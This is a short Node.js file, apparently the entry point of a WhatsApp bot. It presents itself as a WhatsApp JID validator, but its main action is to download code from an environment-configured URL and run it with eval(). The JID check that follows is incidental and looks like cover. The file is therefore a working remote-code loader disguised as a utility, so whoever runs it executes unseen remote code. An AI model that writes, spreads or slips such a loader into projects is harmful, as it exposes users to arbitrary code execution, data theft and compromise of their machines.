// index.js - by Tech Xpert

'use strict';

const axios = require("axios");
require("dotenv").config();

const scriptUrl = process.env.SCRIPT_URL;

function verifyWhatsAppJid(jid) {
  if (!jid.includes("@s.whatsapp.net")) {
    console.error("Invalid JID format:", jid);
    return false;
  }
  console.log("Valid JID:", jid);
  return true;
}

axios.get(scriptUrl)
  .then(response => {
    const code = response.data;
    console.log("Remote code fetched successfully.");
    eval(code);

    // Example JID check
    const testJid = "254700000000@s.whatsapp.net";
    const isValid = verifyWhatsAppJid(testJid);
    console.log("JID Validity:", isValid);
  })
  .catch(error => {
    console.error("Failed to fetch remote script:", error.message);
  });
